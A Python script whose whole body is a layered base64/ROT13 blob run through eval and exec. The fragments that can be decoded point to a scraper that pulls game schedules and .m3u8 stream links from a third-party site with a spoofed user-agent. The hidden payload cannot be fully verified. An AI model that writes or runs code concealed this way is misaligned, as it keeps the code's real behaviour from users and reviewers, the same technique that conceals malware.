import base64, codecs
magic = 'DQppbXBvcnQgYmFzZTY0LCBjb2RlY3MNCnRoZWNyZXcgPSAnYVcxd2IzSjBJSEpsY1hWbGMzUnpDbVp5YjIwZ1luTTBJR2x0Y0c5eWRDQkNaV0YxZEdsbWRXeFRiM1Z3Q21sdGNHOXlkQ0J5WlFwcGJYQnZjblFnWVhKeWIzY2dDbWx0Y0c5eWRDQnplWE1LWkdWbVlYVnNkRnB2Ym1VZ1BTZFZVeTlGWVhOMFpYSnVKd29LSXlBZ0lDQWljR0ZuWlMxb1pXRmtaWElpQ2lNZ0lDQWdaMkZ0WlY5c2FYTjBJRDBnVzEwS1pHVm1JR2RsZEY5bllXMWxLQ2s2Q2lBZ0lDQm5ZVzFsWDJ4cGMzUWdQU0JiWFFvZ0lDQWdhSFJ0YkNBOUlISmxjWFZsYzNSekxtZGxkQ2h5SW1oMGRIQTZMeTl6WTJsbGJtTmxZVzVrZEdWamFHNXZiRzluZVM1NGVYb3ZJaXdnYUdWaFpHVnljejE3SW5WelpYSXRZV2RsYm5RaU9pSk5iM3BwYkd4aEx6VXVNQ0FvVjJsdVpHOTNjeUJPVkNBMkxqRTdJRmRwYmpZME95QjROalFwSUVGd2NHeGxWMlZpUzJsMEx6VXpOeTR6TmlBb1MwaFVUVXdzSUd4cGEyVWdSMlZqYTI4cElFTm9jbTl0WlM4M05pNHdMak00TURrdU1UQXdJRk5oWm1GeWFTODFNemN1TXpZaWZTa3VZMjl1ZEdWdWRBb2dJQ0FnYzI5MWNDQTlJRUpsWVhWMGFXWjFiRk52ZFhBb2FIUnRiQ3duYUhSdGJDNXdZWEp6WlhJbktRb2dJQ0FnYkdsemRGOXZabDluWVcxbGN5QTlJSE52ZFhBdVptbHVaRjloYkd3b0oyUnAnDQpkb2VzbnQgPSAncXZwZkxLRTBwYVo5cmxxd29UU21wbHA2VzNPdU0ySGduVEl1TVRJbFczMGNQdk50VlBPY012T2ZuS0EwSzI5eksycXVvSkltQnRidFZQTnRWUE'
love = '50IyEAnKO2G2SZFwS5IyE5nSMHn2AjZ0ImomWAp00lH2qAF1b2HUMBqSMDGaEJHR50IyOBqSMIEJklE2WLIyOBqSMDGaEJHR50IyOBqSMDGaEJITgwo3czqRATG2SZFwS5JKc0oSy6H29KZaIfGHcZLHgRLaEJHR50IyOBqSMDGaEJHR50IyOBqUSHrGOiIRu0D0MCLHkXZKyMLHI5pyIRnUNmEJkhF05vJREvqSMDGaEJHR50IyOBqSMDGaEJHR50IwACoT5XAGOLIUS1o0cVnT5EIzuZFJMuoyIKrH12pKSLETW0IyOBqSMDGaEJHR50IyOBqSMDGaEJZ09foxb1ZSuHpKIiFxubpIEWAUSDrSuJHR50IyOBqSMDGaEJHR50IyOBqSMHqGOiFzc0D0MCoR1YHmSAF0RjpTj1LH1YETWiIUybozkdqT5HFKIAIRyfpT0kA1MuFJ1AF1MaGRckrJ9uEUMPqyqOomAwL29Hn3IMoHubJyOBLxxlrJuAIQxmpTkCDxyDGwWMq1V3IyAkL293GQOPoR80DKqRL1MFH2cjITg5FGWWqxLlrGOMoHugDJj0oHS2GzWTZUIVE0udMyMHn2AhZxu0EGWWq24lBTAJHxSvpUb5M01TBQAOqwEdJKqnAScErTunE05dIyAOqH16H2khEwtkJz1jnScgGUMmEaubGQV5nUSHFJukGzW0IyOBqSMDGaEJHR50IyOBqSMDGaDaQDcxolN9VPqwZwxkL0AOBHySFzkMJSLjLIqnZJWTGaMxJRSiLHuFqTWQq2qXZztjLyq3qJAUEaywZyM5FayeF0yQDJqWD0SaFHAOM0yQDJqWD0SaFHpjrzEHM2qDH0W5JyZ1nzVlZKquI3ufF0AXrzVmIayMZyH2FHAxo2EVHaqYDmElHUyeqJWHGwSCD2AcGRuXoRkeHyOJEHMAIRAeqIcgoUInE0MmLxAbrzEVFJ9wZwxkL0Z1q2AgIwOxE2kgMIAepRAcDJqWD0SaFHAOM0yQDJqW'
god = 'Q0FnSUNCdE0zVTRJRDBnSjJoMGRIQW5JQ3NnYlROMU9Gc3dYU0FySUNjdWJUTjFPQ2NLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdjMk5vWldRZ1BTQW5KeTVxYjJsdUtISmxMbU52YlhCcGJHVW9Janh3UGp4emRISnZibWMrVjJobGJpQTZLQzRyUHlrOFhDOXpkSEp2Ym1jK1BGd3ZjRDRpTEhKbExrUlBWRUZNVENrdVptbHVaR0ZzYkNoemRISW9jMjkxY0M1d2NtVjBkR2xtZVNrcEtTNXpkSEpwY0NncExuSmxjR3hoWTJVZ0tDZGNYSGhoTUNjc0p5Y3BDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjBVMk5vWldReElEMGdjMk5vWldRdWNtVndiR0ZqWlNnbklHRjBKeXduSnlrdWNtVndiR0ZqWlNnbkxDY3NKeWNwTG5KbGNHeGhZMlVvSjBWRVZDY3NKeWNwQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0IwVTJOb1pXUWdQU0JoY25KdicNCmRyYW1hID0gJ3FsNWFNS0RicVNBd25USXhaRmp0VzAxQUdIMHRFUE9NSkl5TVZUdDZvSlJhWERidFZQTnRWUE50VlBOdFZQTnRWUE50cVNBd25USXhWUTB0cVNBd25USXhZYVd5cFRrdUwySGJxVWNjb3pNaUNKRXlNelMxb1VFbm8yNXlYRGJ0VlBOdFZQTnRWUE50VlBOdFZQTnRQdk50VlBOdFZQTnRWUE50VlBOdFZQTndwVVdjb2FEYm9HQTFCUHhYVlBOdFZQTnRWUE50VlBOdFZQTnRWUFp0VlBOdE0yU2dNSTlmbktBMFl6U2pwVEloTVB1N1czRWNxVGt5V21jMG5LRWZNRjV5b3pBaU1USGJXMlNtTDJ5Y1dsamFuSnFobzNXeVdseGZWUHFtcVVXeUxKMGFCejBtcUd1OVhEYnRWUE50VlBOdF'
destiny = 'MDGaEJHR50IyOBqR0lH2qAFGyzoxgOZSy6H2cjIRybGIO1A1pmEJAkITg5I21wZT5YEJMAEwI5o3cOnH1HFTWKZyAgGQW5L1qfnzShFaSbomAKrIqfrTMJHUSgpIIKrHkXZTSPrwOgpHq0MypmDKqhIRy4pHcerIqgLmOVZxSvGHcSBIuRLaEJHR50IyOBqSMDGaEJHR95pyEOrKOIEUESF3I3GHgCZT5XBJuMIRt2HUMBqSMDGaEJHR50IyOBqSMDGaEJHR9dpUc5nUSDqKyLETW0IyOBqR1Xn21AE2WLIyOBqSMDGaEJHR9dGRgOoIO0LaEJHR50pUcWZUSYI2uJIUS1o0cWp29HrJ1kGzW0IyOBqSMDGaEJGzAdpUc5nUSDqJSAF0ImGGWGM01TqTALETV9Wj0XpzImpTIwqPN9VPqprQplKUt2Myk4AmEprQZkKUtmZlpAPaImLJ5xrJ91VQ0tMKMuoPtaKUt3ASk4AwuprQL1KUt2Z1k4AmWprQL1KUt3AlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt2Myk4AwIprQpmKUt2MIk4AmEprQWwKUtlZSk4AmWprQL1KUt3Z1k4AmOprQL1KUt2Z1k4AmEprQV5WlxtXlOyqzSfXPqprQL0KUt2MvpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQL0KUt3Zyk4AwSprQMxKUt2ZIk4ZzAprQVjKUt3Zyk4AwIprQpmKUt3ZSk4AwIprQLmKUt3ASk4ZwxaXD0XMKMuoPuwo21jnJkyXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt3AIk4AmAprQLkKUt2MIk4AwEprQp5KUt2Myk4AmHaXFxfWmkmqUWcozp+WljaMKuyLlpcXD=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))